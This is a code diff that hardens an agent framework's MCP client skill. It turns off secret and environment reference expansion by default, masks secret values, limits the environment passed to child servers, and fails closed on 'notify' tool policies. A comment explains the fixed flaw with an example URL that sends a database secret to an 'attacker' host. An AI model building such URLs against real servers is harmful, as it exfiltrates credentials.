@@ -3,46 +3,152 @@ import { tool } from '../../core/decorators';
 import type { Context, Tool, StructuredToolResult, PricingConfig } from '../../core/types';
 import type { ContentItem, ImageContent } from '../../uamp/types';
 import { ensureContentId } from '../../uamp/content';
+import {
+  SecretReferenceError,
+  atConnectSentence,
+  expandReferences,
+  maskMap,
+  maskText,
+  maskUrl,
+  type ReferenceLookup,
+} from '../secrets/references';
+import {
+  mcpProblemLine,
+  mcpServersFromConfig,
+  mcpSdkMissing,
+  qualifiedToolName,
+  type McpServersResolution,
+  type ResolvedMcpTransport,
+} from './config';
 
 // ---------------------------------------------------------------------------
-// MCP SDK lazy-loaded references
+// The MCP SDK, loaded when the skill loads
 // ---------------------------------------------------------------------------
 
-let mcpAvailable = false;
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-let MCPClient: any;
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-let StdioTransport: any;
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-let SSETransport: any;
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-let StreamableHTTPTransport: any;
+/* eslint-disable @typescript-eslint/no-explicit-any */
 
-async function ensureMCP(): Promise<boolean> {
-  if (mcpAvailable) return true;
+/** The client half of `@modelcontextprotocol/sdk`, as this skill uses it. */
+export interface McpClientSdk {
+  Client: any;
+  StdioClientTransport: any;
+  /** Absent in an SDK build without the transport. */
+  SSEClientTransport?: any;
+  StreamableHTTPClientTransport?: any;
+  /** The variables a stdio server gets besides its own `env` (PATH, HOME and the like); absent in an older SDK. */
+  getDefaultEnvironment?: () => Record<string, string>;
+}
+
+/** How each SDK module is imported; a test hands in one that fails. */
+export interface McpSdkImports {
+  client: () => Promise<any>;
+  stdio: () => Promise<any>;
+  sse: () => Promise<any>;
+  http: () => Promise<any>;
+}
+
+// Dynamic, with literal specifiers (`@vite-ignore`, `as string`): the portal
+// typechecks this source against a node_modules that may not carry the
+// package, and a static import would fail that gate instead of this load.
+const DEFAULT_IMPORTS: McpSdkImports = {
+  client: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/index.js' as string),
+  stdio: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/stdio.js' as string),
+  sse: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/sse.js' as string),
+  http: () => import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/streamableHttp.js' as string),
+};
+
+let loadedSdk: McpClientSdk | undefined;
+
+/**
+ * The SDK, or an error that says what failed (2026-09-26). `ensureMCP()` used
+ * to answer `false`, and `initialize()` then printed one console line and
+ * returned: an agent whose file named MCP servers started with none of their
+ * tools, and nothing in its startup report said why. The package is a declared
+ * dependency now; if it still cannot load, the agent file's loader reports
+ * this skill as failed, with the reason, as it does any other skill
+ * (`skills/resolve.ts`). The message is pinned by the shared fixture.
+ */
+export async function loadMcpSdk(imports: Partial<McpSdkImports> = {}): Promise<McpClientSdk> {
+  if (loadedSdk) return loadedSdk;
+  const modules = { ...DEFAULT_IMPORTS, ...imports };
+  let clientMod: any;
+  let stdioMod: any;
   try {
-    // Dynamic imports for optional MCP SDK dependency
-    const clientMod = await import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/index.js' as string);
-    MCPClient = clientMod.Client;
-    const stdioMod = await import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/stdio.js' as string);
-    StdioTransport = stdioMod.StdioClientTransport;
-    try {
-      const sseMod = await import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/sse.js' as string);
-      SSETransport = sseMod.SSEClientTransport;
-    } catch {
-      // SSE transport not available
-    }
-    try {
-      const httpMod = await import(/* @vite-ignore */ '@modelcontextprotocol/sdk/client/streamableHttp.js' as string);
-      StreamableHTTPTransport = httpMod.StreamableHTTPClientTransport;
-    } catch {
-      // Streamable HTTP transport not available
-    }
-    mcpAvailable = true;
-    return true;
-  } catch {
-    return false;
+    clientMod = await modules.client();
+    stdioMod = await modules.stdio();
+  } catch (err) {
+    throw new Error(mcpSdkMissing((err as Error)?.message ?? String(err)));
   }
+  const sdk: McpClientSdk = { Client: clientMod?.Client, StdioClientTransport: stdioMod?.StdioClientTransport };
+  if (typeof sdk.Client !== 'function' || typeof sdk.StdioClientTransport !== 'function') {
+    throw new Error(mcpSdkMissing('the package has no Client or StdioClientTransport export'));
+  }
+  if (typeof stdioMod?.getDefaultEnvironment === 'function') sdk.getDefaultEnvironment = stdioMod.getDefaultEnvironment;
+  // The two remote transports are optional: an SDK build without one still
+  // serves stdio servers, and a remote server that needs it is reported then.
+  try {
+    sdk.SSEClientTransport = (await modules.sse()).SSEClientTransport;
+  } catch {
+    // no SSE transport in this build
+  }
+  try {
+    sdk.StreamableHTTPClientTransport = (await modules.http()).StreamableHTTPClientTransport;
+  } catch {
+    // no Streamable HTTP transport in this build
+  }
+  loadedSdk = sdk;
+  return sdk;
+}
+
+/** Forget the loaded SDK, so a test can load it again with other imports. */
+export function resetMcpSdkForTests(): void {
+  loadedSdk = undefined;
+}
+
+let MCPClient: any;
+let StdioTransport: any;
+let SSETransport: any;
+let StreamableHTTPTransport: any;
+let DefaultEnvironment: (() => Record<string, string>) | undefined;
+
+/**
+ * Why a server did not connect: the sentence (every resolved value masked)
+ * and, when a `${secret:NAME}` was not stored, the names, so `doctor` can
+ * print the `webagents secrets set` command that fixes it.
+ */
+export class McpConnectError extends Error {
+  readonly missingSecrets: string[];
+  /** `${env:NAME}` variables that are not set (2026-09-26), for `doctor`'s fix line. */
+  readonly missingEnv: string[];
+
+  constructor(message: string, missingSecrets: string[] = [], missingEnv: string[] = []) {
+    super(message);
+    this.name = 'McpConnectError';
+    this.missingSecrets = missingSecrets;
+    this.missingEnv = missingEnv;
+  }
+}
+
+/** One server as `serverReport()` describes it (interactive-mode spec 3.7): never a value. */
+export interface McpServerReportRow {
+  name: string;
+  transport: ResolvedMcpTransport | 'unknown';
+  connected: boolean;
+  /** The qualified names of the tools it registered. */
+  tools: string[];
+  /** Why it is not connected, when it tried and failed. */
+  error?: string;
+  /** Why the loader refused it, when it never tried. */
+  rejected?: string;
+  /** `${secret:NAME}` references that are not stored. */
+  missingSecrets: string[];
+  /** `${env:NAME}` variables that are not set (2026-09-26), for `doctor`'s fix line. */
+  missingEnv?: string[];
+  /** The loader's warnings about secret-looking literals. */
+  warnings: string[];
+  /** Its `env`, `headers` and address as a report may show them: references as written, everything else masked. */
+  env?: Record<string, string>;
+  headers?: Record<string, string>;
+  url?: string;
 }
 
 // ---------------------------------------------------------------------------
@@ -150,12 +256,70 @@ export interface MCPServerConfig {
   prompt?: { name?: string; priority?: number; text: string };
 }
 
+/** What `${secret:NAME}` reads: null or undefined means "not stored". */
+export type SecretReader = (name: string) => Promise<string | null | undefined> | string | null | undefined;
+
+/**
+ * The sources `${env:NAME}` and `${secret:NAME}` resolve from (S-292), and
+ * the switch that turns resolution on at all (S-295, 2026-09-26).
+ */
+export interface ReferenceSources {
+  /** What `${env:NAME}` reads. */
+  env: Record<string, string | undefined>;
+  /** What `${secret:NAME}` reads. */
+  secret: SecretReader;
+}
+
 export interface MCPSkillConfig {
   agentName?: string;
   agentPath?: string;
   baseDir?: string;
   mcp?: Record<string, MCPServerConfig> | { mcpServers: Record<string, MCPServerConfig> };
+  /**
+   * RESOLUTION IS OFF UNLESS THIS IS SET (S-295, CRITICAL, 2026-09-26). The
+   * skill resolved `${env:NAME}` and `${secret:NAME}` in every server's url,
+   * headers and env against `process.env` and the CLI keystore for EVERY
+   * `MCPSkill`, so a host that builds one from data its users saved (the
+   * portal, from a hosted agent's MCP entries) expanded
+   * `https://attacker/mcp?k=${env:POSTGRES_URL}` from its OWN environment and
+   * sent the value to that server. Now nothing is expanded unless the builder
+   * hands in the sources: a `${...}` in any field is sent as the literal bytes
+   * written. Only the agent-file loaders pass sources (`ownerReferenceSources`:
+   * the process environment and the keystore `webagents secrets set` writes),
+   * for a file the local owner wrote and runs. A host never does.
+   */
+  references?: ReferenceSources;
   [key: string]: unknown;
+}
+
+/**
+ * The sources an agent file's servers resolve against: the process
+ * environment, and the CLI's own secret store (the one `webagents secrets set
+ * NAME` writes, for the active profile), opened on the first reference and
+ * never before. For the agent-file loaders only (`skills/resolve.ts`, the
+ * Python `cli/agent_builder.py`); see `MCPSkillConfig.references`.
+ */
+/**
+ * The refusal a `notify` tool answers when no host hook can ask for approval
+ * (S-286 addendum, 2026-09-26): the fixture's `tool_policies.no_hook.refusal`,
+ * `{name}` being the qualified tool name.
+ */
+export const NOTIFY_NO_HOOK_REFUSAL =
+  'Error: {name} needs approval (its policy is notify) and nothing here can ask for it, so it did not run. Use allow to run it or block to withhold it.';
+
+export function notifyNoHookRefusal(name: string): string {
+  return NOTIFY_NO_HOOK_REFUSAL.replace('{name}', name);
+}
+
+export function ownerReferenceSources(env: Record<string, string | undefined> = process.env): ReferenceSources {
+  let store: Promise<{ get(name: string): Promise<string | null> }> | undefined;
+  return {
+    env,
+    secret: async (name) => {
+      if (!store) store = import('../../cli/provider-keys.js').then(({ providerKeyStore }) => providerKeyStore());
+      return (await store).get(name);
+    },
+  };
 }
 
 // ---------------------------------------------------------------------------
@@ -174,6 +338,34 @@ interface ToolRegistryEntry {
 // MCPSkill
 // ---------------------------------------------------------------------------
 
+/**
+ * Where an MCP stdio server's stderr goes (B8, 2026-09-28): a descriptor
+ * appending to `<profile folder>/logs/mcp-<name>.log`, the folder the chat's
+ * log is in, never the terminal the chat draws on. `undefined` when that
+ * folder cannot be written; the caller then discards the output. The Python
+ * twin is `local/mcp/skill.py` `mcp_stderr_log`.
+ */
+export async function mcpStderrLog(name: string): Promise<number | undefined> {
+  try {
+    const fs = await import('node:fs');
+    const path = await import('node:path');
+    const { globalDir } = await import('../../cli/config-store');
+    const folder = path.join(globalDir(), 'logs');
+    fs.mkdirSync(folder, { recursive: true });
+    const safe = name.replace(/[^A-Za-z0-9._-]/g, '_') || 'server';
+    return fs.openSync(path.join(folder, `mcp-${safe}.log`), 'a');
+  } catch {
+    return undefined;
+  }
+}
+
+function closeStderrLog(fd: number | undefined): void {
+  if (fd === undefined) return;
+  import('node:fs')
+    .then((fs) => fs.closeSync(fd))
+    .catch(() => undefined);
+}
+
 export class MCPSkill extends Skill {
   private mcpConfig: MCPSkillConfig;
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
@@ -183,7 +375,16 @@ export class MCPSkill extends Skill {
   private mcpPrompts: Map<string, MCPPrompt[]> = new Map();
   private _initialized = false;
   private _cleanupFns: Array<() => Promise<void>> = [];
-
+  /** What the file named, as the normalizer read it, for `serverReport()`. */
+  private resolution: McpServersResolution | undefined;
+  /** Why a server did not connect, by name, masked (S-292). */
+  private connectErrors: Map<string, { message: string; missingSecrets: string[]; missingEnv: string[] }> = new Map();
+  /**
+   * Where the servers were read from (the chat's `/mcp`, interactive-mode
+   * spec 3.7): the config handed in (the agent file's `- mcp:` entry), or
+   * `mcp.json` next to the agent.
+   */
+  configSource: 'config' | 'mcp.json' = 'config';
   constructor(config: MCPSkillConfig = {}) {
     super({ name: 'MCPSkill' });
     this.mcpConfig = config;
@@ -196,26 +397,35 @@ export class MCPSkill extends Skill {
   override async initialize(): Promise<void> {
     if (this._initialized) return;
 
-    const available = await ensureMCP();
-    if (!available) {
-      console.warn(
-        '[MCPSkill] @modelcontextprotocol/sdk is not installed — MCP tools will not be available.',
-      );
+    // Throws, with the reason, when the SDK cannot load (`loadMcpSdk`).
+    const sdk = await loadMcpSdk();
+    MCPClient = sdk.Client;
+    StdioTransport = sdk.StdioClientTransport;
+    SSETransport = sdk.SSEClientTransport;
+    StreamableHTTPTransport = sdk.StreamableHTTPClientTransport;
+    DefaultEnvironment = sdk.getDefaultEnvironment;
+
+    const resolution = await this._loadMCPConfig();
+    this.resolution = resolution;
+    // Said once, at load (S-292): a literal that looks like a key, with the
+    // reference and the command that keep it out of the file.
+    for (const { name, reason } of resolution.warnings) {
+      console.warn(mcpProblemLine('warning', name, reason));
+    }
+    const servers = resolution.configs as Record<string, MCPServerConfig>;
+    if (Object.keys(servers).length === 0) {
       return;
     }
 
-    const servers = await this._loadMCPConfig();
-    if (!servers || Object.keys(servers).length === 0) {
-      return;
-    }
+    const names = Object.keys(servers);
+    const results = await Promise.allSettled(names.map((name) => this._connectServer(name, servers[name])));
 
-    const results = await Promise.allSettled(
-      Object.entries(servers).map(([name, cfg]) => this._connectServer(name, cfg)),
-    );
-
-    for (const result of results) {
+    for (const [index, result] of results.entries()) {
       if (result.status === 'rejected') {
-        console.error('[MCPSkill] Server connection failed:', result.reason);
+        // The message only, already masked by `_connectServer`: the error
+        // object itself could carry a transport's request and repeat a value.
+        const reason = (result.reason as Error)?.message ?? String(result.reason);
+        console.error(mcpProblemLine('failed', names[index], reason));
       }
     }
 
@@ -272,6 +482,8 @@ export class MCPSkill extends Skill {
     this.toolsRegistry.clear();
     this.resources.clear();
     this.mcpPrompts.clear();
+    this.connectErrors.clear();
+    this.resolution = undefined;
     this._initialized = false;
   }
 
@@ -279,37 +491,121 @@ export class MCPSkill extends Skill {
   // Config loading
   // =========================================================================
 
-  private async _loadMCPConfig(): Promise<Record<string, MCPServerConfig>> {
-    // 1. Config object passed directly
-    if (this.mcpConfig.mcp) {
-      const raw = this.mcpConfig.mcp;
-      if ('mcpServers' in raw) {
-        return (raw as { mcpServers: Record<string, MCPServerConfig> }).mcpServers;
-      }
-      return raw as Record<string, MCPServerConfig>;
+  /**
+   * The servers to connect to: the config given directly, in either shape
+   * (`config.ts`, pinned by the shared fixture), else `mcp.json` next to the
+   * agent, which a bare `- mcp` entry means, as it does in Python. A server
+   * the normalizer rejects is named, and the others still load.
+   */
+  private async _loadMCPConfig(): Promise<McpServersResolution> {
+    let raw: unknown = this.mcpConfig.mcp;
+    this.configSource = 'config';
+    if (!raw || (typeof raw === 'object' && Object.keys(raw as object).length === 0)) {
+      raw = await this._readMcpJson();
+      this.configSource = 'mcp.json';
     }
+    const resolution = mcpServersFromConfig(raw);
+    for (const { name, reason } of resolution.rejected) {
+      console.warn(mcpProblemLine('rejected', name, reason));
+    }
+    return resolution;
+  }
 
-    // 2. Try loading mcp.json from disk (Node environments only)
+  // =========================================================================
+  // Secrets (S-292)
+  // =========================================================================
+
+  /**
+   * `config` with every reference in `env`, `headers` and the address
+   * replaced, for this connection only. `config` itself stays as written,
+   * so nothing that reports or saves a configuration can see a value.
+   * Throws {@link McpConnectError} with the connect-time sentence, which
+   * names the reference and never a value.
+   *
+   * ONLY WITH SOURCES (S-295): a skill built without `references` expands
+   * nothing, and every field is used as the literal bytes written.
+   */
+  private async resolveReferences(name: string, config: MCPServerConfig): Promise<{ live: MCPServerConfig; values: string[] }> {
+    const values: string[] = [];
+    const sources = this.mcpConfig.references;
+    if (!sources) return { live: { ...config }, values };
+    const lookup: ReferenceLookup = { secret: (n) => sources.secret(n), env: sources.env };
+    const expand = async (value: string, field: string, key?: string): Promise<string> => {
+      try {
+        const expanded = await expandReferences(value, lookup);
+        values.push(...expanded.values);
+        return expanded.text;
+      } catch (err) {
+        if (err instanceof SecretReferenceError) {
+          throw new McpConnectError(atConnectSentence(name, field, key, err.message), err.missingSecret ? [err.missingSecret] : [], err.missingEnv ? [err.missingEnv] : []);
+        }
+        throw err;
+      }
+    };
+    const live: MCPServerConfig = { ...config };
+    if (config.env) {
+      live.env = {};
+      for (const [key, value] of Object.entries(config.env)) live.env[key] = await expand(String(value), 'env', key);
+    }
+    if (config.headers) {
+      live.headers = {};
+      for (const [key, value] of Object.entries(config.headers)) live.headers[key] = await expand(String(value), 'headers', key);
+    }
+    for (const field of ['url', 'httpUrl', 'mcpUrlTemplate'] as const) {
+      const value = config[field];
+      if (typeof value === 'string' && value) live[field] = await expand(value, field);
+    }
+    return { live, values };
+  }
+
+  /**
+   * Every server the file named, for `/mcp` and `doctor`: connected or not,
+   * its tools, why it failed or was refused, the loader's warnings, and its
+   * configuration with references as written and every other value masked.
+   */
+  serverReport(): McpServerReportRow[] {
+    const rows: McpServerReportRow[] = [];
+    const resolution = this.resolution;
+    if (!resolution) return rows;
+    for (const server of resolution.servers) {
+      const failure = this.connectErrors.get(server.name);
+      const row: McpServerReportRow = {
+        name: server.name,
+        transport: server.transport,
+        connected: this.sessions.has(server.name),
+        tools: [...this.toolsRegistry.entries()]
+          .filter(([, entry]) => entry.server === server.name)
+          .map(([qualified]) => qualified)
+          .sort(),
+        missingSecrets: failure?.missingSecrets ?? [],
+        missingEnv: failure?.missingEnv ?? [],
+        warnings: resolution.warnings.filter((w) => w.name === server.name).map((w) => w.reason),
+      };
+      if (failure) row.error = failure.message;
+      if (server.env) row.env = maskMap(server.env);
+      if (server.headers && Object.keys(server.headers).length) row.headers = maskMap(server.headers);
+      if (server.url) row.url = maskUrl(server.url);
+      rows.push(row);
+    }
+    for (const { name, reason } of resolution.rejected) {
+      rows.push({ name, transport: 'unknown', connected: false, tools: [], rejected: reason, missingSecrets: [], warnings: [] });
+    }
+    return rows;
+  }
+
+  /** `mcp.json` next to the agent (Node only); nothing when there is none. */
+  private async _readMcpJson(): Promise<unknown> {
     const baseDir =
       this.mcpConfig.baseDir ??
       this.mcpConfig.agentPath ??
       (typeof process !== 'undefined' ? process.cwd() : undefined);
-
-    if (!baseDir) return {};
-
+    if (!baseDir) return undefined;
     try {
       const fs = await import('node:fs/promises');
       const path = await import('node:path');
-      const configPath = path.join(baseDir, 'mcp.json');
-      const raw = await fs.readFile(configPath, 'utf-8');
-      const parsed = JSON.parse(raw) as Record<string, unknown>;
-
-      if ('mcpServers' in parsed && typeof parsed.mcpServers === 'object') {
-        return parsed.mcpServers as Record<string, MCPServerConfig>;
-      }
-      return parsed as unknown as Record<string, MCPServerConfig>;
+      return JSON.parse(await fs.readFile(path.join(baseDir, 'mcp.json'), 'utf-8')) as unknown;
     } catch {
-      return {};
+      return undefined;
     }
   }
 
@@ -403,16 +699,39 @@ export class MCPSkill extends Skill {
     return 'auto';
   }
 
+  /**
+   * Connect one server. The config is kept AS WRITTEN in `serverConfigs`;
+   * the copy with references resolved (`live`) exists for this call only.
+   * Whatever fails, the error that leaves here is a plain sentence with
+   * every resolved value masked, recorded for `serverReport()`.
+   */
   private async _connectServer(name: string, config: MCPServerConfig): Promise<void> {
     this.serverConfigs.set(name, config);
     if (config.pricing) {
       this.serverPricing.set(name, config.pricing);
     }
+    let values: string[] = [];
+    try {
+      const resolved = await this.resolveReferences(name, config);
+      values = resolved.values;
+      await this._openServer(name, resolved.live);
+    } catch (err) {
+      const message = maskText((err as Error)?.message ?? String(err), values);
+      const missingSecrets = err instanceof McpConnectError ? err.missingSecrets : [];
+      const missingEnv = err instanceof McpConnectError ? err.missingEnv : [];
+      this.connectErrors.set(name, { message, missingSecrets, missingEnv });
+      throw new McpConnectError(message, missingSecrets, missingEnv);
+    }
+  }
+
+  private async _openServer(name: string, live: MCPServerConfig): Promise<void> {
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     let transport: any;
+    // The descriptor a stdio server's stderr is written to (B8); undefined otherwise.
+    let stderrLog: number | undefined;
 
-    if (config.url || config.mcpUrlTemplate) {
-      const composed = this._composeServerUrl(name, config);
+    if (live.url || live.mcpUrlTemplate) {
+      const composed = this._composeServerUrl(name, live);
       if (!composed) return;
       const { url, queryAuth } = composed;
 
@@ -421,20 +740,20 @@ export class MCPSkill extends Skill {
       // - api_key           → custom raw header, or legacy Authorization bearer
       // - api_key_query     → token is in URL; no header
       // - none              → no auth at all
-      const headers: Record<string, string> = { ...(config.headers ?? {}) };
-      const authType = config.authType ?? (config.auth?.type as MCPAuthType | undefined) ?? 'none';
-      if (!queryAuth && config.auth?.token && (authType === 'oauth2' || authType === 'api_key')) {
+      const headers: Record<string, string> = { ...(live.headers ?? {}) };
+      const authType = live.authType ?? (live.auth?.type as MCPAuthType | undefined) ?? 'none';
+      if (!queryAuth && live.auth?.token && (authType === 'oauth2' || authType === 'api_key')) {
         if (authType === 'api_key') {
-          headers[config.auth.headerName || 'Authorization'] = config.auth.headerName
-            ? config.auth.token
-            : `Bearer ${config.auth.token}`;
+          headers[live.auth.headerName || 'Authorization'] = live.auth.headerName
+            ? live.auth.token
+            : `Bearer ${live.auth.token}`;
         } else {
-          headers[config.auth.headerName || 'Authorization'] = `Bearer ${config.auth.token}`;
+          headers[live.auth.headerName || 'Authorization'] = `Bearer ${live.auth.token}`;
         }
       }
 
       const requestInit: RequestInit = Object.keys(headers).length ? { headers } : {};
-      const transportKind = this._resolveTransportKind(config);
+      const transportKind = this._resolveTransportKind(live);
 
       const tryHttp = transportKind === 'http' || transportKind === 'auto';
       const trySse = transportKind === 'sse' || transportKind === 'auto';
@@ -461,13 +780,25 @@ export class MCPSkill extends Skill {
         console.warn(`[MCPSkill] No usable transport for server "${name}".`);
         return;
       }
-    } else if (config.command) {
-      // Stdio transport
+    } else if (live.command) {
+      // The MCP SDK's default environment (PATH, HOME and the like) plus
+      // ONLY this entry's `env`, resolved (S-292, 2026-09-26). It was
+      // `{...process.env, ...env}` whenever `env` was set: every variable of
+      // the agent process, provider keys included, went to a server that
+      // `npx -y` had just fetched.
+      const base = DefaultEnvironment ? DefaultEnvironment() : {};
+      // THE SERVER'S STDERR IS NOT THE CHAT'S (B8, 2026-09-28): the
+      // transport's default, `inherit`, drew a server's banner and warnings
+      // over the chat. It goes to `<profile folder>/logs/mcp-<name>.log`
+      // (`mcpStderrLog`); the child keeps its own copy of the descriptor, so
+      // this process closes its copy once the child is started.
+      stderrLog = await mcpStderrLog(name);
       transport = new StdioTransport({
-        command: config.command,
-        args: config.args ?? [],
-        env: config.env ? { ...process.env, ...config.env } : undefined,
-        cwd: config.cwd,
+        command: live.command,
+        args: live.args ?? [],
+        env: { ...base, ...(live.env ?? {}) },
+        cwd: live.cwd,
+        stderr: stderrLog ?? 'ignore',
       });
     } else {
       console.warn(
@@ -484,20 +815,22 @@ export class MCPSkill extends Skill {
     try {
       await client.connect(transport);
     } catch (err) {
+      closeStderrLog(stderrLog);
+      stderrLog = undefined;
       // If `auto` failed via HTTP, fall back to SSE once.
-      if (this._resolveTransportKind(config) === 'auto' && transport && SSETransport) {
+      if (this._resolveTransportKind(live) === 'auto' && transport && SSETransport) {
         try {
-          const composed = this._composeServerUrl(name, config);
+          const composed = this._composeServerUrl(name, live);
           if (composed) {
-            const headers: Record<string, string> = { ...(config.headers ?? {}) };
-            const authType = config.authType ?? 'none';
-            if (!composed.queryAuth && config.auth?.token && (authType === 'oauth2' || authType === 'api_key')) {
+            const headers: Record<string, string> = { ...(live.headers ?? {}) };
+            const authType = live.authType ?? 'none';
+            if (!composed.queryAuth && live.auth?.token && (authType === 'oauth2' || authType === 'api_key')) {
               if (authType === 'api_key') {
-                headers[config.auth.headerName || 'Authorization'] = config.auth.headerName
-                  ? config.auth.token
-                  : `Bearer ${config.auth.token}`;
+                headers[live.auth.headerName || 'Authorization'] = live.auth.headerName
+                  ? live.auth.token
+                  : `Bearer ${live.auth.token}`;
               } else {
-                headers[config.auth.headerName || 'Authorization'] = `Bearer ${config.auth.token}`;
+                headers[live.auth.headerName || 'Authorization'] = `Bearer ${live.auth.token}`;
               }
             }
             const fallback = new SSETransport(composed.url, { requestInit: { headers } });
@@ -513,6 +846,8 @@ export class MCPSkill extends Skill {
         throw err;
       }
     }
+    // The child has its own copy of the log's descriptor now.
+    closeStderrLog(stderrLog);
     this.sessions.set(name, client);
 
     this._cleanupFns.push(async () => {
@@ -549,7 +884,8 @@ export class MCPSkill extends Skill {
         tools = tools.filter((t) => policies[t.name] !== 'block');
       }
       for (const t of tools) {
-        const qualifiedName = `${name}__${t.name}`;
+        // `<server>__<tool>`, always: the one rule both SDKs apply (`config.ts`).
+        const qualifiedName = qualifiedToolName(name, t.name);
         this.toolsRegistry.set(qualifiedName, {
           server: name,
           originalName: t.name,
@@ -602,6 +938,14 @@ export class MCPSkill extends Skill {
       // 'allow' (or any other value, including default) skips the gate.
       const serverCfg = this.serverConfigs.get(serverName);
       const policy = serverCfg?.toolPolicies?.[toolDef.name];
+      // A `notify` tool with NO hook is refused, not run (S-286 addendum,
+      // 2026-09-26): the setting failed open, so an agent file that asked
+      // for approval of a tool, served by `webagents serve` or the chat
+      // with no host hook, ran it without asking. The sentence is the
+      // fixture's (`tool_policies.no_hook`).
+      if (policy === 'notify' && typeof serverCfg?.policyHook !== 'function') {
+        return notifyNoHookRefusal(toolName);
+      }
       if (policy === 'notify' && typeof serverCfg?.policyHook === 'function') {
         try {
           const decision = await serverCfg.policyHook({
